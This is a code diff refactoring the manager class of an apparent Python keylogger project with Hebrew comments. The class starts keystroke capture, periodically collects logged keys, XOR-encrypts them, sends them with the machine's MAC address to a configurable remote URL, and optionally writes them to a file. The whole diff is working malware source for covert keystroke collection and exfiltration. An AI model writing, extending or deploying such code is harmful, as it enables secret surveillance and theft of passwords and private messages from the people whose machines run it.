@@ -1,42 +1,43 @@
-import os
 from KeyLoggerService import KeyLoggerService
-from Network_send import NetworkSend
+from network_writer import NetworkWriter
 from FileWriter import FileWriterWithTime
-from dotenv import load_dotenv
 from Encryptor import XorEncryptor
 from Get_mac import get_mac_address
-import time
+from time import sleep
 
-load_dotenv()
 
 
 class KeyLoggerManager:
     """ניהול התוכנה בעזרת קבצי העזר"""
 
-    def __init__(self,timer: int):
+    def __init__(self,timer: int, encryption_key: str | int, url: str, write_to_file=False):
         """קבלת טיימר לבקשות הנתונים שהוקלדו"""
         self.timer = timer
         self.running = None
         self.logger = KeyLoggerService()
+        self.encryption_key = encryption_key
+        self.encryptor = XorEncryptor()
+        self.network_writer = NetworkWriter(url)
+        self.file_writer = FileWriterWithTime()
+        self.write_to_file = write_to_file
+
 
     def start(self):
         """מתחיל מעקב והרצת הקבצים הנדרשים"""
         self.running = True
         self.logger.start_logging() # תחילת מעקב
         while self.running:
-            time.sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
+            sleep(self.timer) # המתנה לפי פרק הזמן המוגדר
             get_logger = self.logger.get_logged_keys() # קבלת נתונים
             if get_logger: # אם היו הקלדות
-                print(get_logger)
-                logger_encrypt = XorEncryptor(get_logger, os.getenv('encrypt_key')).encrypt() #
-                NetworkSend(logger_encrypt).send_data(get_mac_address()) # שליחה לשרת
-                FileWriterWithTime(logger_encrypt).send_data('Key logger.txt') # הדפסה לקובץ
+                logger_encrypt = self.encryptor.encrypt(get_logger, self.encryption_key) # הצפנה
+                self.network_writer.send_data(logger_encrypt, get_mac_address()) # שליחה לשרת
+                if self.write_to_file:
+                    self.file_writer.send_data(logger_encrypt, 'Key logger.txt') # הדפסה לקובץ
 
-    def stop(self,keystrokes):
+    def stop(self):
         """עצירת המעקב"""
         self.running = False
         self.logger.stop_logging()
-
-# KeyLoggerManager(6).start()
 
 # הושלם
